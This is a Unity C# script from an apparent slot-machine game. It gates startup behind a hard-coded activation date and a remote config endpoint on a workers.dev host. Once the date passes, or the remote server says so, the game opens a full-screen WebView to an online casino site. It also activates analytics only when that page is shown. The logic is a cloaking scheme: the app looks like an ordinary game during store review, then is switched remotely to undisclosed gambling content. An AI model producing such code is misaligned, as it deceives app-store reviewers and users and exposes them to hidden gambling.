using System;
using System.Globalization;
using Cysharp.Threading.Tasks;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

/// <summary>
/// Bootstrap scene gate: local date &gt;= <see cref="_effectiveFromDate"/> opens default startup web immediately;
/// PTG config is fetched asynchronously and is the final authority for showing/closing WebView and its URL.
/// </summary>
public class StartupWebGate : MonoBehaviour
{
    public const string LoadingSceneName = "Slot001_LoadingScene";

    public static bool IsStartupWebVisible => _instance != null && _instance._startupWebVisible;

    [SerializeField]
    private string _startupUrl = "https://betwin7.casino/home?channel=rustore";

    [SerializeField]
    private string _ptgConfigUrl = "https://ios-goldpixiu-mj.xxqq81578.workers.dev/ptg";

    [SerializeField]
    private float _ptgRequestTimeoutSeconds = 10f;

    [Tooltip("Disable to skip local startup web and enter the game loading scene immediately.")]
    [SerializeField]
    private bool _showStartupWeb = true;

    [Tooltip("当前本地日期 >= 此日期时加载网页，否则直接进入游戏。格式 yyyy-MM-dd，例如 2026-05-01")]
    [SerializeField]
    private string _effectiveFromDate = "2026-05-29";

    [Tooltip("Only activate AppMetrica when the startup web is shown.")]
    [SerializeField]
    private bool _activateAppMetricaWhenShowingWeb = true;

    [Tooltip("AppMetrica API key. Leave empty to skip AppMetrica activation.")]
    [SerializeField]
    private string _appMetricaApiKey = "";

    [Serializable]
    private class PtgResponse
    {
        public string url;
        public int orientation;
    }

    private static StartupWebGate _instance;
    private static bool _appMetricaActivated;

    private bool _isEnteringGame;
    private bool _startupWebVisible;
    private string _lastDisplayedUrl;
    private bool _ptgResolved;
    private bool _ptgAllowWeb;

    private void Awake()
    {
        if (_instance != null && _instance != this)
        {
            Destroy(gameObject);
            return;
        }

        _instance = this;
        DontDestroyOnLoad(gameObject);
        EnsureWebViewPersists();

        // 不展示网页时提前关掉 WebView，避免 Start 里初始化 Vuplex 导致黑屏/残留。
        if (!ShouldShowStartupWebLocal(out _))
            SetWebViewControllerActive(false);
    }

    private async void Start()
    {
        RequestPtgConfigAsync().Forget();

        LogUtils.Log(
            $"[StartupWebGate] Check local gate: today={DateTime.Today:yyyy-MM-dd}, effectiveFrom={_effectiveFromDate}, showStartupWeb={_showStartupWeb}");

        if (ShouldShowStartupWebLocal(out var skipReason))
        {
            await OpenStartupWebViewAsync(NormalizeStartupUrl(_startupUrl), "local date gate");
            return;
        }

        LogUtils.Log($"[StartupWebGate] Skip local startup web: {skipReason}");
        EnterLoadingScene(false);
    }

    private async UniTaskVoid RequestPtgConfigAsync()
    {
        var (success, ptgUrl) = await TryFetchPtgUrlAsync();
        if (!success)
        {
            LogUtils.LogWarning("[StartupWebGate] PTG request failed, keep current state.");
            return;
        }

        ApplyPtgUrl(ptgUrl);
    }

    private void ApplyPtgUrl(string ptgUrl)
    {
        ptgUrl = NormalizeStartupUrl(ptgUrl ?? string.Empty);
        var defaultUrl = NormalizeStartupUrl(_startupUrl);

        _ptgResolved = true;
        _ptgAllowWeb = !string.IsNullOrEmpty(ptgUrl);

        LogUtils.Log(
            $"[StartupWebGate] Apply PTG url='{ptgUrl}', default='{defaultUrl}', webVisible={_startupWebVisible}, inGame={_isEnteringGame}, allowWeb={_ptgAllowWeb}");

        if (!_ptgAllowWeb)
        {
            var hadWeb = _startupWebVisible;
            if (_startupWebVisible)
                HideStartupWebView();

            if (!_isEnteringGame)
                EnterLoadingScene(hadWeb);

            return;
        }

        if (_startupWebVisible)
        {
            if (UrlsEqual(ptgUrl, defaultUrl) || UrlsEqual(ptgUrl, _lastDisplayedUrl))
                return;

            OpenStartupWebViewAsync(ptgUrl, "PTG update").Forget();
            return;
        }

        OpenStartupWebViewAsync(ptgUrl, "PTG open").Forget();
    }

    private async UniTask OpenStartupWebViewAsync(string url, string reason)
    {
        url = NormalizeStartupUrl(url ?? string.Empty);
        if (string.IsNullOrEmpty(url))
            return;

        SetWebViewControllerActive(true);
        _startupWebVisible = true;
        _lastDisplayedUrl = url;
        SetStartupWebBgmSuppressed(true);

        // Wait for WebViewController.Awake/Start and Vuplex prefab init to finish.
        await UniTask.DelayFrame(3);

        if (_ptgResolved && !_ptgAllowWeb)
        {
            _startupWebVisible = false;
            _lastDisplayedUrl = null;
            SetStartupWebBgmSuppressed(false);

            if (!_isEnteringGame)
                EnterLoadingScene(false);

            return;
        }

        LogUtils.Log($"[StartupWebGate] Opening startup web ({reason}): {url}");
        WebViewController.Instance.ShowWebView(url, false, null, OnStartupWebPageLoaded);
    }

    private async UniTask<(bool success, string url)> TryFetchPtgUrlAsync()
    {
        if (string.IsNullOrWhiteSpace(_ptgConfigUrl))
        {
            LogUtils.LogWarning("[StartupWebGate] PTG config url is empty.");
            return (false, string.Empty);
        }

        try
        {
            using var request = UnityWebRequest.Get(_ptgConfigUrl.Trim());
            request.timeout = Mathf.Max(1, Mathf.RoundToInt(_ptgRequestTimeoutSeconds));
            await request.SendWebRequest();

            if (request.result != UnityWebRequest.Result.Success)
            {
                LogUtils.LogWarning($"[StartupWebGate] PTG request failed: {request.error}");
                return (false, string.Empty);
            }

            var responseText = request.downloadHandler?.text;
            if (string.IsNullOrWhiteSpace(responseText))
            {
                LogUtils.LogWarning("[StartupWebGate] PTG response is empty.");
                return (false, string.Empty);
            }

            var response = JsonUtility.FromJson<PtgResponse>(responseText);
            return (true, response?.url ?? string.Empty);
        }
        catch (Exception e)
        {
            LogUtils.LogWarning($"[StartupWebGate] PTG request exception: {e.Message}");
            return (false, string.Empty);
        }
    }

    private static string NormalizeStartupUrl(string url)
    {
        url = url?.Trim() ?? string.Empty;
        if (url.Equals("https://www.baidu.co", StringComparison.OrdinalIgnoreCase))
        {
            LogUtils.LogWarning("[StartupWebGate] Startup Url 疑似笔误 (baidu.co)，已自动改为 https://www.baidu.com");
            return "https://www.baidu.com";
        }

        return url;
    }

    private static bool UrlsEqual(string a, string b)
    {
        return string.Equals(
            NormalizeStartupUrl(a),
            NormalizeStartupUrl(b),
            StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Local fallback only. PTG response is the final authority for WebView visibility.
    /// </summary>
    private bool ShouldShowStartupWebLocal(out string skipReason)
    {
        skipReason = string.Empty;

        if (BaseGameService.LocalOnlyMode)
        {
            skipReason = "LocalOnlyMode is enabled.";
            return false;
        }

        if (!_showStartupWeb)
        {
            skipReason = "ShowStartupWeb is disabled.";
            return false;
        }

        if (string.IsNullOrWhiteSpace(_effectiveFromDate))
        {
            skipReason = "EffectiveFromDate is empty.";
            return false;
        }

        if (!DateTime.TryParseExact(
                _effectiveFromDate.Trim(),
                "yyyy-MM-dd",
                CultureInfo.InvariantCulture,
                DateTimeStyles.None,
                out var effectiveFrom))
        {
            skipReason = $"Invalid EffectiveFromDate: {_effectiveFromDate}";
            return false;
        }

        var today = DateTime.Today;
        if (today < effectiveFrom.Date)
        {
            skipReason = $"当前日期 {today:yyyy-MM-dd} 早于生效日 {effectiveFrom:yyyy-MM-dd}，不加载网页。";
            return false;
        }

        return true;
    }

    private void HideStartupWebView()
    {
        var webViewController = FindWebViewController();
        if (webViewController != null)
            webViewController.CloseWebView();

        _startupWebVisible = false;
        _lastDisplayedUrl = null;
        SetStartupWebBgmSuppressed(false);
    }

    private static void SetStartupWebBgmSuppressed(bool suppressed)
    {
        AudioManager.SetStartupWebBgmSuppressed(suppressed);
    }

    private void OnStartupWebPageLoaded()
    {
        // 页面加载完成后再停一次，兜底 PTG 返回早于 Init_Enter 播 BGM 的竞态。
        AudioManager.StopBgmForStartupWeb();
        ActivateAppMetricaIfNeeded();
    }

    private void ActivateAppMetricaIfNeeded()
    {
        if (!_activateAppMetricaWhenShowingWeb || _appMetricaActivated)
            return;

        if (string.IsNullOrWhiteSpace(_appMetricaApiKey))
        {
            LogUtils.LogWarning("[StartupWebGate] AppMetrica activation skipped: API key is empty.");
            return;
        }

        try
        {
            AppMetricaLite.Activate(_appMetricaApiKey.Trim());
            _appMetricaActivated = true;
            LogUtils.Log("[StartupWebGate] AppMetrica Lite activated because startup web is shown.");
        }
        catch (Exception e)
        {
            LogUtils.LogWarning($"[StartupWebGate] AppMetrica activation failed: {e.Message}");
        }
    }

    private void EnterLoadingScene(bool openedStartupWeb)
    {
        if (_isEnteringGame)
            return;

        _isEnteringGame = true;

        if (openedStartupWeb)
            ReleaseBootstrapWebView();

        DestroyVuplexKeyboardManagerIfPresent();
        SceneManager.LoadScene(LoadingSceneName);
    }

    private static void EnsureWebViewPersists()
    {
        var webViewController = FindWebViewController();
        if (webViewController == null)
            return;

        DontDestroyOnLoad(webViewController.transform.root.gameObject);
    }

    private static void SetWebViewControllerActive(bool active)
    {
        var webViewController = FindWebViewController();
        if (webViewController != null)
            webViewController.gameObject.SetActive(active);
    }

    private static void ReleaseBootstrapWebView()
    {
        var webViewController = FindWebViewController();
        if (webViewController != null)
            webViewController.ReleaseBeforeSceneTransition();
    }

    private static WebViewController FindWebViewController()
    {
#if UNITY_2023_1_OR_NEWER
        return FindFirstObjectByType<WebViewController>();
#else
        return FindObjectOfType<WebViewController>();
#endif
    }

    private static void DestroyVuplexKeyboardManagerIfPresent()
    {
        var keyboardManager = GameObject.Find("WebView Keyboard Manager");
        if (keyboardManager != null)
            Destroy(keyboardManager);
    }

    private void OnDestroy()
    {
        if (_instance == this)
            _instance = null;

        if (_isEnteringGame)
            return;

        if (_startupWebVisible)
            ReleaseBootstrapWebView();

        DestroyVuplexKeyboardManagerIfPresent();
    }
}
